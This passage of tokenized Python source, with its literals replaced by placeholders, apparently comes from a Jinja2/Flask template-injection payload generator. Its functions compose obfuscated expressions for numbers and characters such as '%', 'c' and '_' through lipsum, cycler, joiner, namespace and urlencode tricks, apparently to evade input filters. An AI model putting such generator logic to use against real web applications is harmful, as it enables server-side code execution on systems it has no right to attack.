context : dict , value : int ) : <EOL> if value <= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> falses = [ ( LITERAL , "<STR_LIT>" ) for _ in range ( value - <NUM_LIT> ) ] <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + falses <EOL> + [ ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_indexofglobal ( context : dict , value : int ) : <EOL> alternatives = [ ] <EOL> if value <= <NUM_LIT> or value > <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> for global_var in [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] : <EOL> falses = [ ( LITERAL , "<STR_LIT>" ) for _ in range ( value - <NUM_LIT> ) ] <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + falses <EOL> + [ ( LITERAL , f"<STR_LIT>" ) ] <EOL> ) <EOL> alternatives . append ( target_list ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( ONEOF , * alternatives ) ] ) ] <EOL> @ expression_gen <EOL> def gen_integer_literal ( context : dict , value : int ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , str ( value ) ) ] ) ] <EOL> @ expression_gen <EOL> def gen_integer_context ( context : dict , value : int ) : <EOL> if value not in context . values ( ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> v = [ k for k , v in context . items ( ) if v == value ] [ <NUM_LIT> ] <EOL> return [ <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , v ) , ( WITH_CONTEXT_VAR , v ) ] ) , <EOL> ] <EOL> @ expression_gen <EOL> def gen_integer_zero ( context : dict , value : int ) : <EOL> if value != <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( ZERO , ) ] <EOL> @ expression_gen <EOL> def gen_integer_positive ( context : dict , value : int ) : <EOL> if value <= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( POSITIVE_INTEGER , value ) ] <EOL> @ expression_gen <EOL> def gen_integer_negative ( context : dict , value : int ) : <EOL> if value >= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" ) , ( POSITIVE_INTEGER , abs ( value ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_integer_subtract ( context : dict , value : int ) : <EOL> ints = [ <EOL> ( var_name , var_value ) <EOL> for var_name , var_value in context . items ( ) <EOL> if isinstance ( var_value , int ) and var_value > <NUM_LIT> <EOL> ] <EOL> if ints == [ ] : <EOL> return [ ( UNSATISFIED , ) ] <EOL> ints . sort ( key = lambda pair : pair [ <NUM_LIT> ] , reverse = True ) <EOL> bigger = [ pair for pair in ints if pair [ <NUM_LIT> ] >= value ] <EOL> if not bigger : <EOL> return [ ( UNSATISFIED , ) ] <EOL> to_sub_name , to_sub_value = min ( bigger , key = lambda pair : pair [ <NUM_LIT> ] ) <EOL> ints = [ pair for pair in ints if pair [ <NUM_LIT> ] <= to_sub_value ] <EOL> value_left = to_sub_value - value <EOL> sub_vars = [ ] <EOL> while value_left != <NUM_LIT> : <EOL> while ints and ints [ <NUM_LIT> ] [ <NUM_LIT> ] > value_left : <EOL> ints = ints [ <NUM_LIT> : ] <EOL> if not ints : <EOL> return [ ( UNSATISFIED , ) ] <EOL> value_left -= ints [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> sub_vars . append ( ints [ <NUM_LIT> ] [ <NUM_LIT> ] ) <EOL> return [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . format ( <EOL> "<STR_LIT>" . join ( <EOL> [ <EOL> to_sub_name , <EOL> ] <EOL> + sub_vars <EOL> ) <EOL> ) , <EOL> ) <EOL> ] + [ <EOL> ( WITH_CONTEXT_VAR , v ) <EOL> for v in [ <EOL> to_sub_name , <EOL> ] <EOL> + sub_vars <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_literal1 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_literal2 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , '<STR_LIT>' ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_joindict ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_joinnamespacedict ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_lipsumurlencode ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_lipsumbatch ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_joinerbatch ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_namespacebatch ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_classbatch ( context ) : <EOL> alternatives = [ <EOL> [ <EOL> ( LITERAL , f"<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> for class_obj in [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for tostring_filter in [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( ONEOF , * alternatives ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_lower_c_classbatch2 ( context ) : <EOL> alternatives = [ <EOL> [ <EOL> ( LITERAL , f"<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> for class_obj in [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( ONEOF , * alternatives ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_literal1 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_literal2 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , '<STR_LIT>' ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_context ( context ) : <EOL> if "<STR_LIT>" not in context . values ( ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> v = [ k for k , v in context . items ( ) if v == "<STR_LIT>" ] [ <NUM_LIT> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , v ) , ( WITH_CONTEXT_VAR , v ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_urlencode1 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_urlencode2 ( context ) : <EOL> return [ <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_percent_lipsum1 ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_percent_lipsum2 ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_percent_lipsum3 ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_percent_lipsum4 ( context ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_percent_moddoc ( context ) : <EOL> target_list = [ <EOL> ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) <EOL> ] , <EOL> [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) <EOL> ] , <EOL> ) , <EOL> ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( INTEGER , <NUM_LIT> ) , ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( INTEGER , <NUM_LIT> ) , ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_namespace ( context ) : <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_dictbatch ( context ) : <EOL> whatever_onedigit_number = ( ONEOF , * [ [ ( INTEGER , i ) ] for i in range ( <NUM_LIT> , <NUM_LIT> ) ] ) <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> whatever_onedigit_number , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING_LOWERC , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lipsum ( context ) : <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" <EOL> + "<STR_LIT>" <EOL> + "<STR_LIT>" , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lipsumcomplex ( context ) : <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_urlencodelong ( context ) : <EOL> target_list = [ <EOL> ( ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) , <EOL> ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( REQUIRE_PYTHON3 , ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( REQUIRE_PYTHON3 , ) ] , <EOL> [ ( VARIABLE_OF , '<STR_LIT>' ) ] , <EOL> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_replaceformat ( context ) : <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> ( STRING_LOWERC , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_replaceformat2 ( context ) : <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> ( STRING_LOWERC , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_replaceformat3 ( context ) : <EOL> target_list = [ <EOL> ( <EOL> ONEOF , <EOL> * [ <EOL> [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . replace ( <EOL> "<STR_LIT>" , str ( i ) <EOL> ) , <EOL> ) <EOL> ] <EOL> for i in range ( <NUM_LIT> , <NUM_LIT> ) <EOL> ] , <EOL> ) , <EOL> ( STRING_LOWERC , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_literal1 ( context ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_literal2 ( context ) : <EOL> target_list = [ ( LITERAL , '<STR_LIT>' ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_literal3 ( context ) : <EOL> target_list = [ ( LITERAL , '<STR_LIT>' ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_literal5 ( context ) : <EOL> target_list = [ <EOL> ( ONEOF , * [ <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> ] ) , <EOL> ( ONEOF , * [ <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ] ) , <EOL> ( ONEOF , * [ <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> ] ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_context ( context ) : <EOL> if "<STR_LIT>" not in context . values ( ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> vs = [ k for k , v in context . items ( ) if v == "<STR_LIT>" ] <EOL> alternatives = [ [ ( LITERAL , v ) ] + [ ( WITH_CONTEXT_VAR , v ) ] for v in vs ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( ONEOF , * alternatives ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_concat ( context ) : <EOL> return [ ( STRING_CONCAT , ( STRING_PERCENT , ) , ( STRING_LOWERC , ) ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_dictjoin ( context ) : <EOL> pattern = "<STR_LIT>" <EOL> targets = targets_from_pattern ( pattern , { <EOL> "<STR_LIT>" : ( STRING_PERCENT , ) , <EOL> "<STR_LIT>" : ( STRING_LOWERC , ) <EOL> } ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_listjoin ( context ) : <EOL> pattern = "<STR_LIT>" <EOL> targets = targets_from_pattern ( pattern , { <EOL> "<STR_LIT>" : ( STRING_PERCENT , ) , <EOL> "<STR_LIT>" : ( STRING_LOWERC , ) <EOL> } ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_tuplejoin ( context ) : <EOL> pattern = "<STR_LIT>" <EOL> targets = targets_from_pattern ( pattern , { <EOL> "<STR_LIT>" : ( STRING_PERCENT , ) , <EOL> "<STR_LIT>" : ( STRING_LOWERC , ) <EOL> } ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_replaceconcat ( context ) : <EOL> pattern = "<STR_LIT>" <EOL> targets = targets_from_pattern ( pattern , { <EOL> "<STR_LIT>" : ( STRING_LOWERC , ) , <EOL> "<STR_LIT>" : ( STRING_PERCENT , ) , <EOL> "<STR_LIT>" : ( INTEGER , <NUM_LIT> ) <EOL> } ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_percent_lower_c_cycler ( context ) : <EOL> pattern = ( "<STR_LIT>" <EOL> + "<STR_LIT>" ) <EOL> targets = targets_from_pattern ( pattern , { <EOL> "<STR_LIT>" : ( INTEGER , <NUM_LIT> ) , <EOL> "<STR_LIT>" : ( INTEGER , <NUM_LIT> ) <EOL> } ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_asis ( context , count : int ) : <EOL> if count != <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( STRING_PERCENT_LOWER_C , ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_multiply ( context , count : int ) : <EOL> return [ ( MULTIPLY , ( STRING_PERCENT_LOWER_C , ) , ( INTEGER , count ) ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_literal1 ( context , count : int ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( LITERAL , "<STR_LIT>" * count ) , ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_literal2 ( context , count : int ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) , ( LITERAL , "<STR_LIT>" * count ) , ( LITERAL , '<STR_LIT>' ) ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_replacespace ( context , count : int ) : <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , count ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING_PERCENT_LOWER_C , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_nulljoin ( context , count : int ) : <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + [ ( LITERAL , "<STR_LIT>" ) for _ in range ( count + <NUM_LIT> ) ] <EOL> + [ ( LITERAL , "<STR_LIT>" ) , ( STRING_PERCENT_LOWER_C , ) , ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_nulljoin2 ( context , count : int ) : <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + [ ( LITERAL , "<STR_LIT>" ) for _ in range ( count + <NUM_LIT> ) ] <EOL> + [ ( LITERAL , "<STR_LIT>" ) , ( STRING_PERCENT_LOWER_C , ) , ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_concat ( context , count : int ) : <EOL> return [ ( STRING_CONCATMANY , [ ( STRING_PERCENT_LOWER_C , ) for _ in range ( count ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_many_percent_lower_c_join ( context , count : int ) : <EOL> l = [ <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING_PERCENT_LOWER_C , ) , <EOL> ] <EOL> if i == <NUM_LIT> <EOL> else [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING_PERCENT_LOWER_C , ) , <EOL> ] <EOL> for i in range ( count ) <EOL> ] + [ [ ( LITERAL , "<STR_LIT>" ) ] ] <EOL> target_list = [ item for lst in l for item in lst ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_literal1 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_literal2 ( context ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , '<STR_LIT>' ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_context ( context : dict ) : <EOL> if "<STR_LIT>" in context . values ( ) : <EOL> v = [ k for k , v in context . items ( ) if v == "<STR_LIT>" ] [ <NUM_LIT> ] <EOL> target_list = [ ( LITERAL , v ) ] + [ ( WITH_CONTEXT_VAR , v ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> return [ ( UNSATISFIED , ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_format ( context ) : <EOL> targets = [ <EOL> ( ONEOF , * [ <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ] ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( INTEGER , ord ( "<STR_LIT>" ) ) ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_lipsum ( context ) : <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_tupleselect ( context ) : <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_underline_gget ( context ) : <EOL> target_list = [ <EOL> ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , <NUM_LIT> ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_twounderline_concat ( context ) : <EOL> return [ ( STRING_CONCAT , ( STRING_UNDERLINE , ) , ( STRING_UNDERLINE , ) ) ] <EOL> @ expression_gen <EOL> def gen_string_twounderline_multiply ( context ) : <EOL> return [ ( MULTIPLY , ( STRING_UNDERLINE , ) , ( INTEGER , <NUM_LIT> ) ) ] <EOL> @ expression_gen <EOL> def gen_string_twounderline_format ( context ) : <EOL> targets = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING , "<STR_LIT>" ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING_UNDERLINE , ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING_UNDERLINE , ) ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_twounderline_formatfilter ( context ) : <EOL> targets = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING , "<STR_LIT>" ) 